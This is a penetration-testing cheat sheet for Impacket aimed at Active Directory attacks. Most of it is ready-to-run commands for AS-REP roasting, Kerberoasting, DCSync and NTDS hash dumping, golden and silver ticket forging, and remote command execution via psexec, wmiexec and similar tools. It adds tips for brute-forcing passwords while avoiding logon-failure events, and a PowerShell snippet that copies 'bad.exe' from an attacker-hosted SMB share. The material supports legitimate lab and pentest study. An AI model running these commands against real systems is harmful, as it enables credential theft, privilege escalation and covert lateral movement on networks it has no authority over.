# Impacket 

WARNING impacket does not handle NTFS well - [Ippsec Blackfield HTB](https://www.youtube.com/watch?v=IfCysW0Od8w)

From [Impacket Github](https://github.com/SecureAuthCorp/impacket)
*"Impacket is a collection of Python classes for working with network protocols."*
## What protocols are featured?
-   Ethernet, Linux "Cooked" capture.
-   IP, TCP, UDP, ICMP, IGMP, ARP.
-   IPv4 and IPv6 Support.
-   NMB and SMB1, SMB2 and SMB3 (high-level implementations).
-   MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.
-   Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.
-   Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.
-   Portions of TDS (MSSQL) and LDAP protocol implementations.

Impacket is an awesome suite of scripts written in python that are incorpated into tools like [[Crackmapexec-Cheatsheet]]. It is very useful suite of tools for [[Active-Directory-Enumeration-Defined]], [[Active-Directory-Footholding]], [[Attacking-Kerberos]], [[Active-Directory-Lateral-Movement]] and general [[Active-Directory-Privilege-Escalation]].

Haak9 Technical tips
```bash
# All the Impacket scripts support Kerberos authentication as well:
# -k -no-pass
# must specify host as FQDN and user as realm/user
       
# MISC
# - NETLOGON is inefficient (SMB, rpcclient)
# - RDP is slow
# - LDAP binds are faster but still result in event 4625

# Ask for password
kinit user

# Events ID
# - Failing Kerberos pre-authentication DOES NOT trigger a Logon failure event (4625):
# - Have to manually specify event logging for Kerberos (which is in a different location)
# - If you're only logging on traditional “Logon failures”, you'd miss this.
# - Now failures will be logged as event 4771.
# - So Kerberos pre-auth is a faster and potentially stealthier way to bf password.
```

## dcomexec.py 
Useful for [[Active-Directory-Lateral-Movement]].  A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.
```bash
dcomexec.py $domain/$username:$password@$IP <command>
```
## dpapi.py
Password Encryption tool on Windows

## GetNPUsers.py
For users that do not require Kerberos preauthentiation: 
'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). 
Output is compatible with JtR:[[John-The-Ripper-Cheatsheet]] use `-format hashcat` for  hashcat:[[Hashcat-Cheatsheet]] 

```bash
GetNPUsers.py  -dc-ip $IP -request '$domain/' 
GetNPUsers.py  -dc-ip $IP -request '$domain/' -format hashcat
```
This example will attempt to list and get TGTs for those users that have the property:
```bash
# Get TGT for a user
→ GetNPUsers.py $domain/$user -no-pass
# Get a list of users with UF_DONT_REQUIRE_PREAUTH set
→ GetNPUsers.py $domain/$user:password or GetNPUsers.py $domain/$user
# Request TGTs for all users
→ GetNPUsers.py $domain/$user:password -request or GetNPUsers.py $domain/$user
# Request TGTs for users in a file
→ GetNPUsers.py $domain/ -no-pass -usersfile users.txt
```

## GetTGT.py
Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
```bash
getTGT.py -hashes lm:nt domain.com/user
```

## GetST.py
Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate`.
switch to request the ticket on behalf another user.
```bash
getST.py -hashes $lm:$nt -spn $spn/$spn-dc $domain$/$user
```

## GetUserSPNs.py
This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
```bash
GetUserSPNs.py -dc-ip $dc-ip $spn.info/$notanadmin
```

## mssqlclient.py

```bash
mssqlclient.py -port $PORT $domain/$user@$IP -windows-auth
```

## psexec.py
Similiar to [[Sysinternals-Psexec]] like functionality example using [RemComSvc](https://github.com/kavika13/RemCom). Runs as nt system - wmiexec.py runs as Administrator.
```bash

psexec.py $domain/$username:$password@$IP <command>
```

## raiseChild.py
This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. [[Attacking-Kerberos]] 
```bash
python raiseChild.py childDomain.net/$adminuser
python raiseChild.py childDomain.net/$adminuser:mypwd
python raiseChild.py -hashes LMHASH:NTHASH childDomain.net/$adminuser
```
This will perform the attack and then psexec against target-exec as Enterprise Admin
```bash
python raiseChild.py -target-exec targetHost childDomainn.net/$adminuser
```
This will save the final goldenTicket generated in the ccache target file
```bash
python raiseChild.py -w ccache childDomain.net/$adminuser
```

## secretsdump.py

Exploit DCSync Privileges
```bash
secretsdump.py -dc-ip $IP $domain/$user@$ip
```

Dump a NTDS hashes
```bash
impacket-secretsdump -system system -security security LOCAL
```
[medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)

## smbexec.py
A similar to `psexec.py` without using [RemComSvc](https://github.com/kavika13/RemCom). Instantiates a local smbserver to then receive the output of commands.
```bash
smbexec.py $domain/$username:$password@$IP <command>
```
This is useful in the situation where the target machine does NOT have a writeable share available.

## smbserver.py
Host a Python implementation of an SMB server. Allows to quickly set up shares and user accounts
```bash
smbserver.py $SHARENAME /path/to/your/local/share -smb2support
smbserver.py $SHARENAME /path/to/your/local/share --username $user --password 
$password
```
[IppsecRocks](https://ippsec.rocks/?#), start the smbserver your current directory
```bash
impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
```
On remote:
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
```

```powershell
copy \\$ip\$Sharename\bad.exe
# Move into Share
cd $Share:
```

## ticketer.py
This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC).
```bash
ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
```

## wmiexec.py
A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.
```bash
wmiexec.py $domain/$username:$password@$IP <command>
```

## References
[IppsecRocks](https://ippsec.rocks/?#)
[Haax9](https://cheatsheet.haax.fr/windows-systems/exploitation/remote_execution_techniques/)
[RemComSvc](https://github.com/kavika13/RemCom)
[ntds extracting and rcacking medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)